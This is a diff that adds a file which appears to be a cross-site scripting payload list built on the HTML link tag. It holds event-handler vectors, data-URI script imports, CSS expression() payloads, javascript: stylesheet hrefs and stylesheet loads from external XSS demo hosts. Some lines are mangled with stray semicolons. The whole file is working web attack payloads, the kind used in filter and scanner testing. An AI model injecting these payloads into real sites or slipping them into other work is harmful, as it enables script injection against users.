@@ -1,0 +1,56 @@
+<link draggable="true" ondrag="alert(1)">test</link>
+<link draggable="true" ondragend="alert(1)">test</link>
+<link draggable="true" ondragenter="alert(1)">test</link>
+<link draggable="true" ondragleave="alert(1)">test</link>
+<link draggable="true" ondragstart="alert(1)">test</link>
+<link href=validstyles.css rel=stylesheet onload=alert(1)>
+<link id=x tabindex=1 onactivate=alert(1)></link>
+<link id=x tabindex=1 onbeforeactivate=alert(1)></link>
+<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>
+<link id=x tabindex=1 ondeactivate=alert(1)></link><input id=y autofocus>
+<link onbeforecopy="alert(1)" contenteditable>test</link>
+<link onbeforecut="alert(1)" contenteditable>test</link>
+<link onbeforepaste="alert(1)" contenteditable>test</link>
+<link onblur=alert(1) tabindex=1 id=x></link><input autofocus>
+<link onclick="alert(1)">test</link>
+<link oncontextmenu="alert(1)">test</link>
+<link oncopy="alert(1)" contenteditable>test</link>
+<link oncut="alert(1)" contenteditable>test</link>
+<link ondblclick="alert(1)">test</link>
+<link onfocus=alert(1) id=x tabindex=1 style=display:block>
+<link onfocusin=alert(1) id=x tabindex=1 style=display:block>
+<link onfocusout=alert(1) tabindex=1 id=x></link><input autofocus>
+<link onkeydown="alert(1)" contenteditable>test</link>
+<link onkeypress="alert(1)" contenteditable>test</link>
+<link onkeyup="alert(1)" contenteditable>test</link>
+<link onmousedown="alert(1)">test</link>
+<link onmouseenter="alert(1)">test</link>
+<link onmouseleave="alert(1)">test</link>
+<link onmousemove="alert(1)">test</link>
+<link onmouseout="alert(1)">test</link>
+<link onmouseover="alert(1)">test</link>
+<link onmouseup="alert(1)">test</link>
+<link onpaste="alert(1)" contenteditable>test</link>
+<link onreadystatechange=alert(1) rel=stylesheet href=1>
+"><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;
+<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt; 
+<link rel=stylesheet href=1 onerror=alert(1)>
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1556))%7d
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d
+<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(642))%7d
+<;LINK REL=";stylesheet"; HREF=";http://ha.ckers.org/xss.css";>;
+<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">
+<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
+<LINK REL="stylesheet" HREF="javascript:alert(1026);">
+<LINK REL="stylesheet" HREF="javascript:alert(1659);">
+<LINK REL="stylesheet" HREF="javascript:alert(1799);">
+<;LINK REL=";stylesheet"; HREF=";javascript:alert(1901);";>;
+<LINK REL="stylesheet"HREF="javascript.:alert(251);">
+<LINK REL="stylesheet" HREF="javascript:alert(745);">
+<;LINK REL=";stylesheet"; HREF=";javascript:alert(';XSS';);";>;
+<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
+<link rel="stylesheet" href="javascript:document.vulnerable=true;">
+<link REL="stylesheet" HREF="javascript:document.vulnerable=true;">
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(1590);">
+<LINK REL="stylesheet" HREF="javascript:javascript:alert(676);">
